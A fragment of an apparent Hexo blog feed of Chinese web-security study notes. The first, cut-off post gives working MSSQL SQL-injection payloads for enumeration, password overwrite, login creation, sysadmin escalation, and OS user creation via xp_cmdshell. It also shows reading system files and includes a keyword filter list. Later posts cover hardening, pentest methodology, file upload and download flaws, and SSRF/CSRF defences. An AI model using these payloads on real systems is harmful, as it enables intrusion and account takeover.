class="line">nt5.0:win2000,nt5.2:2003 nt6.1:win7 sp</span><br><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="3-当前连接数据库的用户："><a href="#3-当前连接数据库的用户：" class="headerlink" title="3.当前连接数据库的用户："></a>3.当前连接数据库的用户：</h3><p>（dbo=sa）<br><code>and user&gt;0</code></p><h3 id="4-判断当前连接的数据库："><a href="#4-判断当前连接的数据库：" class="headerlink" title="4.判断当前连接的数据库："></a>4.判断当前连接的数据库：</h3><p>(article)<br><code>and db_name()&gt;0</code></p><h3 id="5-判断其它数据库"><a href="#5-判断其它数据库" class="headerlink" title="5.判断其它数据库"></a>5.判断其它数据库</h3><p><code>and (select name from master..sysdatabases where dbid=6)&gt;0</code></p><h3 id="6-判断表："><a href="#6-判断表：" class="headerlink" title="6.判断表："></a>6.判断表：</h3><p>‘t_jiaozhu’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="7-判断其它表："><a href="#7-判断其它表：" class="headerlink" title="7.判断其它表："></a>7.判断其它表：</h3><p>admin<br><code>and name not in(&#39;t_jiaozhu&#39;,&#39;Aclass&#39;)</code><br>加入到6条语句最后一个括号前：</p><h3 id="8-判断列名："><a href="#8-判断列名：" class="headerlink" title="8.判断列名："></a>8.判断列名：</h3><p>admin(usernae,password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="9-判断值"><a href="#9-判断值" class="headerlink" title="9.判断值"></a>9.判断值</h3><p><code>and (select username from admin)&gt;0</code></p><h3 id="10-改密码："><a href="#10-改密码：" class="headerlink" title="10.改密码："></a>10.改密码：</h3><p>md5,小葵多功能转换工具：111转为md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--</span><br></pre></td></tr></table></figure></p><p>sqlserver高级操作：</p><h1 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h1><h3 id="一。数据库提权："><a href="#一。数据库提权：" class="headerlink" title="一。数据库提权："></a>一。数据库提权：</h3><h4 id="1-添加数据库的用户；"><a href="#1-添加数据库的用户；" class="headerlink" title="1.添加数据库的用户；"></a>1.添加数据库的用户；</h4><p><code>;exec master..sp_addlogin hyq,888888;--</code></p><h4 id="2-查看："><a href="#2-查看：" class="headerlink" title="2.查看："></a>2.查看：</h4><p><code>mssqlserver--企业管理器--安全性--登录</code></p><h4 id="3-提权："><a href="#3-提权：" class="headerlink" title="3.提权："></a>3.提权：</h4><p>把hyq加入sysadmin组<br><code>;exec master..sp_addsrvrolemember hyq,sysadmin;--</code></p><h4 id="4-利用："><a href="#4-利用：" class="headerlink" title="4.利用："></a>4.利用：</h4><p>数据库连接工具：查询分析器,navicat:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from </span><br><span class="line">drop database</span><br></pre></td></tr></table></figure></p><h3 id="二。操作系统提权"><a href="#二。操作系统提权" class="headerlink" title="二。操作系统提权"></a>二。操作系统提权</h3><h4 id="1-新建用户"><a href="#1-新建用户" class="headerlink" title="1.新建用户:"></a>1.新建用户:</h4><p><code>;exec master..xp_cmdshell &#39;net user cisp 888888 /add &#39;--</code></p><h4 id="2-提权："><a href="#2-提权：" class="headerlink" title="2.提权："></a>2.提权：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure><h4 id="3-利用："><a href="#3-利用：" class="headerlink" title="3.利用："></a>3.利用：</h4><p>3389;ipc空连接</p><h3 id="三。读系统文件"><a href="#三。读系统文件" class="headerlink" title="三。读系统文件"></a>三。读系统文件</h3><p><code>c:\boot.ini</code></p><h4 id="1-数据连接工具：navicat"><a href="#1-数据连接工具：navicat" class="headerlink" title="1.数据连接工具：navicat:"></a>1.数据连接工具：navicat:</h4><h4 id="2-查询–新建查询"><a href="#2-查询–新建查询" class="headerlink" title="2.查询–新建查询"></a>2.查询–新建查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure><h3 id="四。向系统写文件"><a href="#四。向系统写文件" class="headerlink" title="四。向系统写文件"></a>四。向系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br><span class="line">a.bat</span><br><span class="line">:1</span><br><span class="line">start iexplore.exe</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure><h3 id="五。xp-cmdshell防御："><a href="#五。xp-cmdshell防御：" class="headerlink" title="五。xp_cmdshell防御："></a>五。xp_cmdshell防御：</h3><h4 id="1-删除："><a href="#1-删除：" class="headerlink" title="1.删除："></a>1.删除：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure><h4 id="2-恢复："><a href="#2-恢复：" class="headerlink" title="2.恢复："></a>2.恢复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure><h4 id="3-防xp-cmdshell"><a href="#3-防xp-cmdshell" class="headerlink" title="3.防xp_cmdshell."></a>3.防xp_cmdshell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">防未公布：cmd反弹</span><br><span class="line">c:\windows\system32\cmd.exe</span><br><span class="line">删除所有默认权限，添加administrator--完全控制</span><br></pre></td></tr></table></figure><h3 id="六-防注入："><a href="#六-防注入：" class="headerlink" title="六.防注入："></a>六.防注入：</h3><h4 id="1-脚本调用："><a href="#1-脚本调用：" class="headerlink" title="1.脚本调用："></a>1.脚本调用：</h4><p>编写防注入脚本：noinject.asp<br>过滤关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and or union ; &apos; sp_ xp_ update</span><br><span class="line">exec select delete drop</span><br><span class="line">防post get cookie</span><br></pre></td></tr></table></figure></p><p>判断哪个脚本有漏洞<br>调用：<code>include file=noinject.asp</code><br>最前面：搜索型</p><h4 id="2-安全编码："><a href="#2-安全编码：" class="headerlink" title="2.安全编码："></a>2.安全编码：</h4><p>int–&gt;cint,参数化查询：</p><h4 id="3-waf"><a href="#3-waf" class="headerlink" title="3.waf:"></a>3.waf:</h4><p>web app fw: 软件，硬件<br>sqlmap:tamper:base<br>通配符：cat ??t /etc/passwd<br>as /**/<br>hash:<br>sqlmap.py -u url -v 3</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web终极加固</title>
    <link href="http://yoursite.com/2018/08/21/web%E7%BB%88%E6%9E%81%E5%8A%A0%E5%9B%BA-mssqlserver/"/>
    <id>http://yoursite.com/2018/08/21/web终极加固-mssqlserver/</id>
    <published>2018-08-21T14:18:05.000Z</published>
    <updated>2018-08-23T14:40:21.488Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="一-中间件加固：tomcat-weblogic-iis"><a href="#一-中间件加固：tomcat-weblogic-iis" class="headerlink" title="一.中间件加固：tomcat,weblogic,iis"></a>一.中间件加固：tomcat,weblogic,iis</h2><p>iis服务管理器-网站–dvbbs–右键–属性</p><h4 id="1-更改默认日志的路径："><a href="#1-更改默认日志的路径：" class="headerlink" title="1.更改默认日志的路径："></a>1.更改默认日志的路径：</h4><p>c:\windows\system32\logfiles:改为d:\dvbbslog:仅system可读写，administrator:读</p><p>日志存放&gt;6个月      w3c:  biglog（日志分析）   ,splunk(日志分析)</p><p>网站–属性</p><h3 id="2-高级：必选协议版本："><a href="#2-高级：必选协议版本：" class="headerlink" title="2.高级：必选协议版本："></a>2.高级：必选协议版本：</h3><p>客户端，cookie:取证</p><p>wireshark:</p><h4 id="3-不要给写入权限："><a href="#3-不要给写入权限：" class="headerlink" title="3.不要给写入权限："></a>3.不要给写入权限：</h4><p>防上传webshell:<br>主目录</p><h4 id="4-不要给目录浏览权限："><a href="#4-不要给目录浏览权限：" class="headerlink" title="4.不要给目录浏览权限："></a>4.不要给目录浏览权限：</h4><p>产生目录遍历</p><p>主目录：</p><h4 id="5-删除不必要映射："><a href="#5-删除不必要映射：" class="headerlink" title="5.删除不必要映射："></a>5.删除不必要映射：</h4><p>主目录–配置：不用到扩展名映射删除，上传.cer</p><h4 id="6-向客户端发送自定义错误信息："><a href="#6-向客户端发送自定义错误信息：" class="headerlink" title="6.向客户端发送自定义错误信息："></a>6.向客户端发送自定义错误信息：</h4><p>反制黑客：<code>&lt;iframe src=http://ip&gt;&lt;/iframe&gt;</code></p><p>主目录–配置–调试：</p><h4 id="7-中层安全策略："><a href="#7-中层安全策略：" class="headerlink" title="7.中层安全策略："></a>7.中层安全策略：</h4><p>限制后台登录ip:<br>admin右键–目录安全性–ip或域名限制<br>允许：192.168.2.6</p><h4 id="8-删除所有自定义错误信息：防黑客："><a href="#8-删除所有自定义错误信息：防黑客：" class="headerlink" title="8.删除所有自定义错误信息：防黑客："></a>8.删除所有自定义错误信息：防黑客：</h4><p>302：挂马页面<br>C:\WINDOWS\help\iisHelp\common\</p><h2 id="二-数据库加固"><a href="#二-数据库加固" class="headerlink" title="二.数据库加固"></a>二.数据库加固</h2><h4 id="1-安全架构："><a href="#1-安全架构：" class="headerlink" title="1.安全架构："></a>1.安全架构：</h4><p>禁止数据库和web同台，web–&gt;dmz,ids,数据库内网</p><h4 id="2-数据库加固："><a href="#2-数据库加固：" class="headerlink" title="2.数据库加固："></a>2.数据库加固：</h4><h5 id="a-鉴别："><a href="#a-鉴别：" class="headerlink" title="a.鉴别："></a>a.鉴别：</h5><p>单因素，双因素：网银：<br>who:你是谁：生物特征，指纹，虹膜，视网膜<br>错误接受率小，交叉错判率小<br>have:卡，证书<br>know:知识，口令，密保问题</p><p>pin码，指纹<br>密码：8-10-14 量子 ecc,rsa</p><h5 id="b-授权：访问控制："><a href="#b-授权：访问控制：" class="headerlink" title="b.授权：访问控制："></a>b.授权：访问控制：</h5><p>最小特权：<br>dac:自主访问：ACL:访问控制列表：客体：文件<br>cl:能力表：主体：用户<br>mac:强制访问：敏感标签：文件：绝密，用户：绝密 安全模型：blp:机密性：禁止上读下写<br>rbac:基于角色:最小特权<br>group:<br>基于上下文：TCP,基于时间，基于内容：邮件过滤<br>everyone,administrators,users</p><h5 id="c-完整性：hash-摘要"><a href="#c-完整性：hash-摘要" class="headerlink" title="c.完整性：hash:摘要"></a>c.完整性：hash:摘要</h5><p>任意长度的消息生成 等长的摘要<br>两个不同的消息产生相同的摘要：碰撞<br>md5:10^42,10^21,10^10 128<br>sha1:160<br>sha256<br>过杀毒软件：<br>头同尾不同，md5相同：<br>头不同尾相同，md5相同</p><h5 id="d-机密性：加密"><a href="#d-机密性：加密" class="headerlink" title="d.机密性：加密"></a>d.机密性：加密</h5><p>https:ssl:安全套接层：握手：身份认证及算法密钥协商，记录：加密<br>cipher suite:算法套件<br>ecdhe(密钥交换)-RSA(签名)-AES(加密)-sha256<br>降级：ecdhe-rsa-3des-md5<br>ssl strip:中间人<br><a href="http://www.taobao.com" target="_blank" rel="noopener">http://www.taobao.com</a><br>arp -a:ip–mac:攻击者<br>ssldos:<br>算法弱点：drown rsa<br>rsa:伪随机数算法：后门：ec-dual-drbg:NSA:-1000万美元，常量–推出密钥，bsafe:<br>高级会话复制：黑产<br>证书伪造<br>证书劫持<br>ukey高级克隆，远程映射，内存泄露<br>网银大盗：3 UKEY</p><h5 id="E-抗抵赖："><a href="#E-抗抵赖：" class="headerlink" title="E:抗抵赖："></a>E:抗抵赖：</h5><p>数字签名：私钥+hash 伪造<br>粒度越小越灵活越安全<br>库—表：行，列：学生，老师，<br>事前检测：运行环境漏洞；数据库漏洞：<br>事中监测：sql语句：查询，返回<br>事后审计：日志</p><h4 id="3-更改默认数据库名字及路径：数据库的配置文件"><a href="#3-更改默认数据库名字及路径：数据库的配置文件" class="headerlink" title="3.更改默认数据库名字及路径：数据库的配置文件"></a>3.更改默认数据库名字及路径：数据库的配置文件</h4><p>防下载：数据库重定向到url:<a href="http://www.dvbbs.com" target="_blank" rel="noopener">http://www.dvbbs.com</a><br>iis服务管理器–网站-dvbbs–data–dvbbs7.mdb<br>右键–重定向到url</p><h2 id="三-权限加固："><a href="#三-权限加固：" class="headerlink" title="三.权限加固："></a>三.权限加固：</h2><p>网站源码目录：c:\bbsbak–右键–安全 ntfs</p><p>1.删除所有默认权限<br>2.添加administrator:完全控制<br>3.添加iis_wpg:完全控制<br>4.添加iusr_benet:只读<br>5.判断哪些目录需要写入权限<br>upload,data,databackup,uploadface—给iusr_benet 写入<br>防webshell<br>6.给以上有写入目录权限的文件夹，执行权限：无<br>iis服务管理器–网站—dvbbs–uploadface–右键–目录–执行权限：无</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试流程</title>
    <link href="http://yoursite.com/2018/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/08/21/渗透测试流程/</id>
    <published>2018-08-21T13:37:05.000Z</published>
    <updated>2018-08-21T14:45:53.178Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-106.png" alt="upload successful"></p><h1 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h1><p>通过实际的攻击进行安全测试与评估的方法</p><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等</p><h1 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h1><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><p>完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。</p><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>费时费力 需要高技术  </p><h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试</p><h5 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h5><p>可以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。时间少代价低  </p><h5 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h5><p>最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 </p><h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><p>黑白组合可以提供对目标系统更加深入和全面的安全审查</p><h1 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h1><p>安全测试方法学开源手册（osstmm） </p><p>网络安全测试指南（NIST SP 800-42） </p><p>OWASP十大Web应用安全威胁项目     </p><p>Web安全威胁分类标准（WASC-TC）  </p><p>完整方法论：PTES 渗透测试执行标准 (Penetration Testing Execution Standard)</p><h1 id="PTES渗透测试执行标准"><a href="#PTES渗透测试执行标准" class="headerlink" title="PTES渗透测试执行标准"></a>PTES渗透测试执行标准</h1><h4 id="1-前期交互阶段-Pre-Engagement-Interaction"><a href="#1-前期交互阶段-Pre-Engagement-Interaction" class="headerlink" title="1.前期交互阶段(Pre-Engagement Interaction)"></a>1.前期交互阶段(Pre-Engagement Interaction)</h4><p>渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h4 id="2情报搜集阶段（Informatin-Gathering）"><a href="#2情报搜集阶段（Informatin-Gathering）" class="headerlink" title="2情报搜集阶段（Informatin Gathering）"></a>2情报搜集阶段（Informatin Gathering）</h4><p>在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等，情报搜集是否充分在很大程度上决定了渗透测试的成败。</p><h4 id="3威胁建模阶段（Threat-Modeling）"><a href="#3威胁建模阶段（Threat-Modeling）" class="headerlink" title="3威胁建模阶段（Threat Modeling）"></a>3威胁建模阶段（Threat Modeling）</h4><p>在搜集到充分的情报信息之后，大家聚集到一起针对获取的信息进行威胁建模与攻击规划，通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道</p><h4 id="4-漏洞分析阶段（Vulnerablity-Analysis）"><a href="#4-漏洞分析阶段（Vulnerablity-Analysis）" class="headerlink" title="4.漏洞分析阶段（Vulnerablity Analysis）"></a>4.漏洞分析阶段（Vulnerablity Analysis）</h4><p>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h4 id="5-渗透攻击阶段（Exploitation）"><a href="#5-渗透攻击阶段（Exploitation）" class="headerlink" title="5.渗透攻击阶段（Exploitation）"></a>5.渗透攻击阶段（Exploitation）</h4><p>在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸（清除痕迹），从而避免造成目标组织安全响应团队的警觉和发现。 </p><h4 id="6-后渗透测试阶段（Post-Exploitation）"><a href="#6-后渗透测试阶段（Post-Exploitation）" class="headerlink" title="6.后渗透测试阶段（Post Exploitation）"></a>6.后渗透测试阶段（Post Exploitation）</h4><p>在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。</p><h4 id="7-报告阶段（Reporting）"><a href="#7-报告阶段（Reporting）" class="headerlink" title="7.报告阶段（Reporting）"></a>7.报告阶段（Reporting）</h4><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发</p><h1 id="安全漏洞的生命周期"><a href="#安全漏洞的生命周期" class="headerlink" title="安全漏洞的生命周期"></a>安全漏洞的生命周期</h1><h4 id="一个典型的安全漏洞的生命周期分为七个部分："><a href="#一个典型的安全漏洞的生命周期分为七个部分：" class="headerlink" title="一个典型的安全漏洞的生命周期分为七个部分："></a>一个典型的安全漏洞的生命周期分为七个部分：</h4><p>1.安全漏洞的挖掘与研究</p><p>2.渗透代码的开发与测试</p><p>3.安全漏洞与渗透代码在封闭团队内流传，截止到这个阶段为oday</p><p>4.安全漏洞与渗透代码开始扩散</p><p>5.恶意程序出现开始传播，厂商发布补丁</p><p>6.渗透代码/恶意程序大规模传播并开始危害互联网，危害达到巅峰</p><p>7.渗透代码/恶意程序/攻击工具逐渐消亡</p><h4 id="安全漏洞生命周期示意图"><a href="#安全漏洞生命周期示意图" class="headerlink" title="安全漏洞生命周期示意图"></a>安全漏洞生命周期示意图</h4><p><img src="\images\pasted-103.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件处理漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/文件处理漏洞/</id>
    <published>2018-08-21T12:53:05.000Z</published>
    <updated>2018-08-21T13:31:18.199Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-102.png" alt="upload successful"></p><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><p>文件处理漏洞分为：任意文件上传漏洞和任意文件下载漏洞</p><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>web应用程序在处理用户上传的文件时，解析了用户上传的恶意脚本文件，导致用户可以直接控制web服务器</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>文件上传时检查不严</p><p>文件上传后对文件名处理不当，允许用户修改文件名的后缀</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>对文件类型进行限制</p><p>对文件名后缀进行限制，采用白名单</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>文件上传目录设置为不可执行</p><p>判断文件的类型，采用白名单策略</p><p>采用随机数来存储文件名</p><p>单独设置文件服务器域名，这个服务器不能运行动态的网页</p><h1 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>网站对用户查看或下载的文件没有做限制，则恶意用户可以查看或下载任意敏感文件，下载系统的配置文件、源代码等，从而获得更多的漏洞</p><h3 id="可能存在的漏洞位置"><a href="#可能存在的漏洞位置" class="headerlink" title="可能存在的漏洞位置"></a>可能存在的漏洞位置</h3><p>导入文件时，直接输入文件名，则可能有注入点</p><p>代码中查看危险函数，如php中的readfile、fopen、file_get_contents</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>过滤.(点)，使用户不能在url中回溯上级目录</p><p>严格判断用户输入参数的格式</p><p>限制文件的访问范围，如php.ini中配置open_basedir</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>请求伪造漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/请求伪造漏洞/</id>
    <published>2018-08-21T11:56:05.000Z</published>
    <updated>2018-08-21T12:45:35.135Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-99.png" alt="upload successful"></p><p>请求伪造漏洞，分为服务端请求伪造漏洞（SSRF）和跨站请求伪造漏洞（CSRF）</p><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务端请求伪造漏洞是一种构造由服务端发起请求的一种安全漏洞，SSRF攻击的目标是从外网无法访问的内部系统，很多web应用都提供从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以下载文件，读取文件内容，攻击者恶意利用存在缺陷的web应用作为代理来攻击远程和本地的服务器。</p><p>如果应用对用户的url和远程返回的信息没有进行验证和过滤，就可能存在这种服务端请求伪造攻击。</p><p>该攻击主要为绕过网络限制，攻击企业内网。</p><h3 id="攻击过程图"><a href="#攻击过程图" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-100.png" alt="upload successful"></p><h3 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h3><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><p>端口扫描，获取banner信息，对内网应用进行指纹识别，file协议读取本地文件</p><h5 id="执行指令："><a href="#执行指令：" class="headerlink" title="执行指令："></a>执行指令：</h5><p>利用get参数，攻击内外网应用程序</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>过滤返回的信息</p><p>统一错误信息</p><p>限制请求端口为http常用端口</p><p>采用黑名单禁止访问内网IP</p><p>禁用不必要的协议</p><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者利用用户的身份发起了用户不知道的请求，比如发个信息，发个留言</p><p>包括但不限于：</p><p>以用户名义发邮件</p><p>发消息</p><p>盗账号</p><p>购买商品</p><p>虚拟货币转账</p><h3 id="攻击过程图-1"><a href="#攻击过程图-1" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-101.png" alt="upload successful"></p><p>所需的特定条件：</p><p>受害者必须登录过正常的网站</p><p>受害者必须打开黑客提供的恶意链接</p><p>网站没有如验证码之类的特殊验证方法</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>最简洁有效的防御方法，CSRF的攻击过程，往往是在用户不知情的情况下构造网络请求，验证码则要求用户必须与应用进行交互。出于用户体验考虑，验证码只能作为一种辅助手段</p><h5 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer  Check"></a>Referer  Check</h5><p>Referer  Check最常见的应用是图片盗链，同样可以用来检查请求是否来自合法的源，Referer  Check的缺陷在于并非什么时候都能取到referer，用户有时出于隐私保护考虑，会禁止referer的发送</p><h5 id="Anti-CSRF-token"><a href="#Anti-CSRF-token" class="headerlink" title="Anti  CSRF  token"></a>Anti  CSRF  token</h5><p>CSRF的本质：其本质原因是：重要操作的所有参数都是可以被攻击者猜测到的</p><p>于是可以通过把参数加密或者使用一些随机数，从而让攻击则无法猜测到参数值</p><p>新增一个参数token，token的值是随机的，只被用户和服务器所共有，不被第三者知晓</p><p>将token同时放在表单和session中，若不一致，则可能为CSRF攻击</p><p>使用token时的原则：</p><p>足够的随机性，使用安全的随机数生成器生成token</p><p>保密性，token尽量放在表单中，把敏感操作由get改为post，由表单提交</p><p>###</p>]]></content>
    
    <summary type="html">
    
